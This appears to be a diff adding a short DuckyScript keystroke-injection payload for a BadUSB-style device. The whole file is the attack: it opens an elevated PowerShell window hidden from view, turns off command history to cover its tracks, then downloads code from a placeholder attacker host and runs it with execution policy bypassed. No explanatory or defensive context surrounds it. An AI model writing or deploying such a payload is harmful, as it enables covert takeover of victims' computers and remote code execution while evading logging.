@@ -1,0 +1,15 @@
+DELAY 800
+GUI X
+DELAY 300
+STRING A
+DELAY 500
+ALT Y
+DELAY 400
+STRING powershell -W hidden
+ENTER
+DELAY 300
+STRING Set-PSReadlineOption -HistorySaveStyle SaveNothing
+DELAY 300
+DELAY 300
+STRING $u='http://attackerIP:attackerPORT/info';$r=Invoke-WebRequest -Uri $u -UseBasicParsing;powershell -nop -Exec Bypass -enc $r
+DELAY 300
